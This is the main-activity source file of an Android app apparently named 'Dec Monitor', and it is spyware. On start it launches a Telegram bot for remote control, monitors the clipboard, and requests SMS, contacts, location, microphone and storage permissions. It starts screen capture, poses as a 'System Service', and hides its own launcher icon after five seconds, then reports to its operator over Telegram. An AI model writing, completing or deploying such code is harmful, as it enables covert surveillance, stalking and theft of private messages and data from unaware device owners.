package com.dec.monitor

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.dec.monitor.input.ClipboardMonitor
import com.dec.monitor.screen.ScreenshotService
import com.dec.monitor.stealth.StealthManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private val PROJECTION_REQUEST = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        TelegramBot.startPolling(applicationContext)
        ClipboardMonitor.start(applicationContext)
        TelegramBot.appContext = applicationContext

        requestPermissions(arrayOf(
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.MODIFY_AUDIO_SETTINGS,
        ), 100)

        findViewById<Button>(R.id.btnStart).setOnClickListener {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(projectionManager.createScreenCaptureIntent(), PROJECTION_REQUEST)
        }

        findViewById<TextView>(R.id.tvStatus).text = "System Service\nTap Start to initialize."

        // auto hide icon after 5 seconds
        Handler(Looper.getMainLooper()).postDelayed({
            StealthManager.hideIcon(applicationContext)
        }, 5000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PROJECTION_REQUEST && resultCode == Activity.RESULT_OK && data != null) {
            val serviceIntent = Intent(this, ScreenshotService::class.java).apply {
                putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode)
                putExtra(ScreenshotService.EXTRA_RESULT_DATA, data)
            }
            startForegroundService(serviceIntent)
            findViewById<TextView>(R.id.tvStatus).text = "✅ Initialized."
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("✅ <b>Dec Monitor active.</b>\n/help for commands.")
            }
        }
    }
}
